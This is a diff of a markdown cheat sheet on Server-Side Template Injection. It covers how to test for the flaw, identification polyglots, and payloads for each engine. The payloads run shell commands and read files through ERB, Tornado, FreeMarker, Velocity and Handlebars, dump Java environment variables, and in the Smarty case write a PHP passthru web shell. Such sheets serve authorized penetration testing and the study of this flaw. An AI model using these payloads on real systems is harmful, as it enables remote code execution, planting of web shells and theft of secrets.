@@ -1,13 +1,13 @@
 # Server-Side Template Injection {SSTI}
 
-# Overview
+## Overview
 
-# Testing for Server-Side Template Injection
++ Server Side template injection is a vulnerability that arises when the web application utilizes a templating engine and excepts user input directly into a templated field or allows a user to use template commands directly without; limit, sanitization or restriction
 
-## Approach
+## Testing for Server-Side Template Injection
 
-+ Fuzz URL paramters with template syntax
-+ Where page edditing which returns somewhere on the web application is possible fuzz those inputs
++ Fuzz URL parameters with template syntax
++ Where page editing which returns somewhere on the web application is possible fuzz those inputs
 + Attempt to induce template related errors which reveal the template engine in use
 + Craft a exploit specific to the templating engine
 
@@ -15,40 +15,40 @@
 
 ~ From [Portswigger](https://portswigger.net/web-security/images/template-decision-tree.png) ~
 
-## Typical Examples of Injectable Areas
+### Typical Examples of Injectable Areas
 
-### URL Paramters
+#### URL Parameters
 
-`domain.net/message?=close_template_tag}}insert_paylaod`
+`domain.net/message?=close_template_tag}}insert_payload`
 
-`domain.net/message?=close_template_tag%>insert_paylaod`
+`domain.net/message?=close_template_tag%>insert_payload`
 
-### Page Editors
+#### Page Editors
 
 ```
 <p>Add ur html yay</p>
 
-<p>{{paylaod}}</p>
+<p>{{payload}}</p>
 
 ```
 
-## Identification Polyglots
+### Identification Polyglots
 
 `${{<%[%'"}}%\`
 
-# Payloads By Template Engine
+## Payloads By Template Engine
 
-## ERB 
+### ERB 
 
-### Tag Syntax
+#### Tag Syntax
 
 `<%= %>`
 
-### Identification Payloads
+#### Identification Payloads
 
 `<%= 7*7 %>`
 
-### General Payloads
+#### General Payloads
 
 `<%= system("cat /path/to/file") %>`
 
@@ -56,48 +56,48 @@
 
 `<%= File.open('/example/arbitrary-file').read %>`
 
-## Tornado
+### Tornado
 
-### Tag Syntax
+#### Tag Syntax
 
 `{{ }}`
 
-### Identification Payloads
+#### Identification Payloads
 
 `{{7*7}}`
 
-### General Payload
+#### General Payload
 
 `{% import os %}{{ os.popen("cat /path/to/file").read() }}`
 
-## FreeMarker
+#### FreeMarker
 
-### Tag Syntax
+##### Tag Syntax
 
 `${ }`
 
-### Identification Payloads
+#### Identification Payloads
 
 `${7*7}`
 
-### General Payload
+##### General Payload
 
 `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /path/to/file") }`
 
-## Velocity
+### Velocity
 
-### Tag Syntax
+#### Tag Syntax
 
 `$class`
 
-### Identification Payloads
+#### Identification Payloads
 
 ```
 #set( $a = "Velocity" )
 $foo
 ```
 
-### General Payload
+#### General Payload
 
 ```
 #set($str=$class.inspect("java.lang.String").type)
@@ -108,13 +108,13 @@ $foo
 #end
 ```
 
-## Handlebars
+### Handlebars
 
-### Tag Syntax
+#### Tag Syntax
 
 `{{ }}`
 
-### General Payload
+#### General Payload
 
 ```
 wrtz{{#with "s" as |string|}}
@@ -138,25 +138,25 @@ wrtz{{#with "s" as |string|}}
 {{/with}}
 ```
 
-## Smarty
+### Smarty
 
-### Tag Syntax
+#### Tag Syntax
 
-### Gneral Payload
+#### General Payload
 
 `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cat /path/to/file']); ?>",self::clearConfig())}`
 
-# Dumping Template Objects
+## Dumping Template Objects
 
-+ It may not always be possible to escalate a SSTI vulnrability to gain RCE
-+ However where template injection is possible there is still a high potential for sensitive data exposure and vulnrability chaining
++ It may not always be possible to escalate a SSTI vulnerability to gain RCE
++ However where template injection is possible there is still a high potential for sensitive data exposure and vulnerability chaining
 + One way to develop a meaningful exploit from a SSTI is to use the native templating languages environment variables to dump all the objects used in the context including custom developer ones
 
-## JAVA Based Engines
+### JAVA Based Engines
 
 `${T(java.lang.System).getenv()}`
 
-# Resources
+## Resources
 
 + [ERB Syntax](https://www.stuartellis.name/articles/erb/)
 + [Server-Side template injection in tornado](https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/)
